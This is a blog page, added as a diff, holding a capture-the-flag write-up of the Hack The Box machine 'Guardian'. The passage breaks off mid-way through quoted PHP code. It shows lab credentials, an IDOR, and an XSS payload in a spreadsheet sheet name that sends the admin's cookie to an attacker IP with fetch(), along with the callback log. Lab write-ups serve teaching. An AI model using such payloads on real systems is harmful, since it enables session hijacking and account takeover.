@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/02/28/hackthebox-guardian/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewGuardian is a hard-difficulty machine from Hack The Box that starts with discovering a student portal where default credentials and an IDOR vulnerability in the chat feature leak a Gitea passw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Guardian">
+<meta property="og:url" content="http://fouedsaidi.com/2026/02/28/Hackthebox-Guardian/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewGuardian is a hard-difficulty machine from Hack The Box that starts with discovering a student portal where default credentials and an IDOR vulnerability in the chat feature leak a Gitea passw">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Guardian/Guardian.png">
+<meta property="article:published_time" content="2026-02-28T19:36:54.000Z">
+<meta property="article:modified_time" content="2026-02-28T19:39:21.612Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="IDOR">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="PHP Filter Chains">
+<meta property="article:tag" content="Apache Module Hijack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Guardian/Guardian.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Guardian -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Guardian</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-02-28 22:36:54</span>
+        <span class="mobile">2026-02-28 22:36:54</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-02-28 22:39:21</span>
+            <span class="mobile">2026-02-28 22:39:21</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/IDOR/">IDOR</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/XSS/">XSS</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CSRF/">CSRF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/LFI/">LFI</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP-Filter-Chains/">PHP Filter Chains</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Apache-Module-Hijack/">Apache Module Hijack</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Guardian is a hard-difficulty machine from Hack The Box that starts with discovering a student portal where default credentials and an IDOR vulnerability in the chat feature leak a Gitea password. From Gitea, we recover application source code revealing a vulnerable PhpSpreadsheet dependency (XSS via sheet names) and a flawed CSRF token implementation. Chaining the XSS to steal an admin session cookie, we exploit the CSRF flaw to create an admin account, then abuse an LFI in the admin reports panel using PHP filter chains to obtain a reverse shell. After cracking database password hashes with a known salt, we pivot to a user account, escalate to another user via a writable Python module, and finally load a malicious Apache module through a restricted binary to get root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Guardian/Guardian.png"
+                      alt="Guardian"
+                ><figcaption>Guardian</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We start with an Nmap scan against the target.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)</span><br><span class="line">|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://guardian.htb/</span><br><span class="line">Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></div>
+
+<p>The HTTP service redirects to <code>guardian.htb</code>, so we add it to <code>/etc/hosts</code>. Visiting the main page reveals <a class="link"   target="_blank" rel="noopener" href="http://guardian.htb/" >Guardian University - Empowering Future Leaders <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>Fuzzing for subdomains reveals <code>portal.guardian.htb</code>, which hosts a <a class="link"   target="_blank" rel="noopener" href="http://portal.guardian.htb/login.php" >Login - Guardian University <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> page.</p>
+<p>Clicking the <strong>Help</strong> button on the login page downloads a PDF guide:</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf" >Guardian_University_Student_Portal_Guide.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><code>Your default password is: GU1234</code></p>
+<p>Scrolling down on <a class="link"   target="_blank" rel="noopener" href="http://guardian.htb/" >Guardian University - Empowering Future Leaders <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> we can see three email addresses:</p>
+<p><strong><a class="link"   href="mailto:&#71;&#x55;&#48;&#49;&#52;&#x32;&#x30;&#50;&#51;&#64;&#x67;&#117;&#x61;&#x72;&#x64;&#105;&#97;&#110;&#x2e;&#x68;&#x74;&#x62;" >&#71;&#x55;&#48;&#49;&#52;&#x32;&#x30;&#50;&#51;&#64;&#x67;&#117;&#x61;&#x72;&#x64;&#105;&#97;&#110;&#x2e;&#x68;&#x74;&#x62; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong><br><strong><a class="link"   href="mailto:&#71;&#x55;&#54;&#x32;&#x36;&#50;&#x30;&#50;&#51;&#64;&#103;&#x75;&#x61;&#114;&#100;&#105;&#97;&#x6e;&#46;&#x68;&#116;&#98;" >&#71;&#x55;&#54;&#x32;&#x36;&#50;&#x30;&#50;&#51;&#64;&#103;&#x75;&#x61;&#114;&#100;&#105;&#97;&#x6e;&#46;&#x68;&#116;&#98; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong><br><strong><a class="link"   href="mailto:&#x47;&#x55;&#x30;&#x37;&#x30;&#50;&#x30;&#x32;&#53;&#64;&#103;&#x75;&#x61;&#x72;&#x64;&#105;&#97;&#110;&#46;&#x68;&#x74;&#98;" >&#x47;&#x55;&#x30;&#x37;&#x30;&#50;&#x30;&#x32;&#53;&#64;&#103;&#x75;&#x61;&#x72;&#x64;&#105;&#97;&#110;&#46;&#x68;&#x74;&#98; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
+<p>Using the student ID format from the emails, we successfully log in with <code>GU0142023:GU1234</code>.</p>
+<h2 id="IDOR-Chat-Feature"><a href="#IDOR-Chat-Feature" class="headerlink" title="IDOR - Chat Feature"></a>IDOR - Chat Feature</h2><p>Once logged in, we notice the IDs in the URL for the chat feature:</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://portal.guardian.htb/student/chat.php?chat_users%5B0%5D=1&chat_users%5B1%5D=2" >Chat - Admin Dashboard <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>The <code>chat_users</code> parameter is vulnerable to IDOR. We use <code>ffuf</code> to fuzz the user IDs and enumerate all available chats. In one of the conversations, we find Gitea credentials:</p>
+<p><code>Here is your password for gitea: DHsNnk3V503</code></p>
+<p><code>jamil.enockson:DHsNnk3V503</code></p>
+<p>We add <code>gitea.guardian.htb</code> to our hosts file (guess or fuzz) and log in.</p>
+<h2 id="Gitea-Source-Code-Review"><a href="#Gitea-Source-Code-Review" class="headerlink" title="Gitea - Source Code Review"></a>Gitea - Source Code Review</h2><p>Inside Gitea, the <code>Guardian/portal.guardian.htb</code> repository contains the full application source code.</p>
+<p>DB config under <a class="link"   target="_blank" rel="noopener" href="http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/config/config.php" >portal.guardian.htb&#x2F;config.php at main - portal.guardian.htb - Gitea: Git with a cup of tea <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;salt&#x27; =&gt; &#x27;8Sb)tM1vs1SS&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>root:Gu4rd14n_un1_1s_th3_b3st</code></p>
+<p>We check <a class="link"   target="_blank" rel="noopener" href="http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/composer.json" >portal.guardian.htb&#x2F;composer.json at main - portal.guardian.htb - Gitea: Git with a cup of tea <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for versions and dependencies:</p>
+<p><code>&quot;phpoffice/phpspreadsheet&quot;: &quot;3.7.0&quot;</code></p>
+<h2 id="XSS-via-PhpSpreadsheet-GHSA-79xx-vf93-p7cx"><a href="#XSS-via-PhpSpreadsheet-GHSA-79xx-vf93-p7cx" class="headerlink" title="XSS via PhpSpreadsheet (GHSA-79xx-vf93-p7cx)"></a>XSS via PhpSpreadsheet (GHSA-79xx-vf93-p7cx)</h2><p>PhpSpreadsheet 3.7.0 is vulnerable to a <a class="link"   target="_blank" rel="noopener" href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx" >Cross-Site Scripting (XSS) vulnerability in generateNavigation() function <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<p>A simple analysis below:</p>
+<ul>
+<li>Affected functions: <code>generateNavigation()</code></li>
+<li>Problem: <code>$sheet-&gt;getTitle()</code> is stitched directly into <code>&lt;a&gt;</code> HTML tags, no <code>htmlspecialchars()</code></li>
+<li>Scenario: When <strong>XLSX has multiple sheets</strong>, a navigation menu is generated.</li>
+<li>An attacker can trigger as long as they can control the <strong>sheet name</strong> of an Excel table.</li>
+</ul>
+<p>Terms of use:</p>
+<ul>
+<li>The attacker would need to upload or have the victim open a <strong>maliciously constructed XLSX file</strong>.</li>
+<li>Server-side converts to HTML and outputs via <code>PhpSpreadsheet\Writer\Html</code>.</li>
+<li>XSS is triggered when the user visits this converted page.</li>
+</ul>
+<p>The problem here is that WPS, some python libraries, and some online editing sites limit the name length or special characters of the sheet. We use <a class="link"   target="_blank" rel="noopener" href="https://www.treegrid.com/FSheet" >FastGrid SpreadSheet like online MS Excel sheet | FastGrid <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to craft the malicious XLSX.</p>
+<p>We set the sheet name to:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">fetch(</span>&quot;<span class="attr">http:</span>//<span class="attr">10.10.16.16</span>/?<span class="attr">c</span>=<span class="string">&quot;+btoa(document.cookie))&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>We submit the file in <a class="link"   target="_blank" rel="noopener" href="http://portal.guardian.htb/student/submission.php?assignment_id=15" >Assignment Details <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<p>Shortly after, we receive a callback on our HTTP server with the admin’s base64-encoded session cookie:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Serving HTTP on :: port 80 (http://[::]:80/) ...</span><br><span class="line">::ffff:10.10.11.84 - - [03/Sep/2025 09:01:05] &quot;GET /?c=UEhQU0VTU0lEPTZiaWhycWF1anBmY2VzN2VhczhyZXF0dXJy HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure></div>
+
+<p>We decode the cookie and hijack the lecturer session.</p>
+<h2 id="CSRF-Creating-an-Admin-Account"><a href="#CSRF-Creating-an-Admin-Account" class="headerlink" title="CSRF - Creating an Admin Account"></a>CSRF - Creating an Admin Account</h2><p>On <a class="link"   target="_blank" rel="noopener" href="http://portal.guardian.htb/lecturer/notices/create.php" >Create Notice - lecturer Dashboard <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, we can post notices with referral links.</p>
+<p>Reviewing the admin user creation endpoint at <code>/admin/createuser.php</code>, we see the full source:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../includes/auth.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../models/User.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config/csrf-tokens.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title function_ invoke__">add_token_to_pool</span>(<span class="variable">$token</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAuthenticated</span>() || <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span> = <span class="keyword">require</span> <span class="string">&#x27;../config/config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$salt</span> = <span class="variable">$config</span>[<span class="string">&#x27;salt&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$userModel</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$pdo</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$csrf_token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_valid_token</span>(<span class="variable">$csrf_token</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid CSRF token!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$full_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;full_name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$dob</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;dob&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_role</span> = <span class="variable">$_POST</span>[<span 